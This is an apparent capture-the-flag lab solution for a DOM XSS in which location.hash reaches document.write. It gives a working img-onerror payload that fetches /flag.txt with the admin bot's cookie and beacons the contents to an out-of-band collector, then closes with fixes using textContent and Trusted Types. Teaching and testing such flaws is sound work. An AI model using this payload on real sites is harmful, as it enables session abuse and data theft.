# Solution — DOM XSS via location.hash into document.write

## The sink

`GET /` ships this inline script, which runs during initial parse:

```js
document.write('<h1>Welcome ' + decodeURIComponent(location.hash.slice(1)) + '</h1>');
```

- **Source:** `location.hash` — attacker-controlled, client-side only (the
  fragment is never sent to the server).
- **Sink:** `document.write` — writes raw HTML into the document stream.

No server-side code is involved, so this is a **DOM-based** XSS (CWE-79,
OWASP A03:2021 – Injection). Server-side output encoding cannot fix it; the flaw
is entirely in the browser.

## Why `<img onerror>` and not `<script>`

HTML parsed via `document.write` **during** the initial parse can include a
`<script>` that executes — but it is fragile (a literal `</script>` in your
payload terminates the surrounding block). The robust, universal primitive is an
element with an inline event handler:

```html
<img src="x" onerror="…JS…" />
```

`src=x` resolves to a 404, `onerror` fires, and your JS runs — no `<script>`
needed.

## Why this beats a direct fetch

`/flag.txt` is served only to a request bearing the admin `session` cookie:

```
GET /flag.txt                    → 403 (you have no admin cookie)
GET /internal/bot-login?k=…      → 403 from the public side (backend-only)
```

You cannot read the flag from your own client. But your injected JS executes in
the **admin bot's** browser, in the app's origin, so a same-origin `fetch`
carries the bot's cookie automatically. This is the essence of XSS: you borrow
the victim's authority.

## The payload

Put this in the fragment (URL-encoded):

```html
<img
  src="x"
  onerror="fetch('/flag.txt').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?f='+encodeURIComponent(t)})"
/>
```

Chain:

```
POST /report      {"url":"/#<url-encoded payload>"}
# admin bot visits /#… → document.write emits the <img> → onerror fires →
# fetch('/flag.txt') (cookie sent) → beacon the body to the collector
GET  /oob/received       # find /report?f=FLAG%7B…%7D, URL-decode → FLAG{…}
```

`tests/exploit.py` automates this and prints the recovered flag.

## Why the containment holds

- The collector is on a `backend` network with `internal: true` — no route off
  the host, so the flag can reach the in-lab collector but never the internet.
- `/flag.txt` and `/internal/bot-login` both require the admin session / backend
  origin, so the DOM XSS is the only path to the flag. `risk: low`.

## The fix

Never pass untrusted input to `document.write` / `innerHTML`. For a text
greeting, assign to `textContent`:

```js
const name = decodeURIComponent(location.hash.slice(1));
const h1 = document.createElement('h1');
h1.textContent = 'Welcome ' + name; // inert — markup becomes literal text
document.body.prepend(h1);
```

A `Trusted Types` policy (`require-trusted-types-for 'script'` via CSP) would
also block the `document.write` sink outright. Defence in depth: an `HttpOnly`
session cookie would not help here (the payload never reads the cookie — it uses
it implicitly via `fetch`), which is exactly why output-side fixes matter.
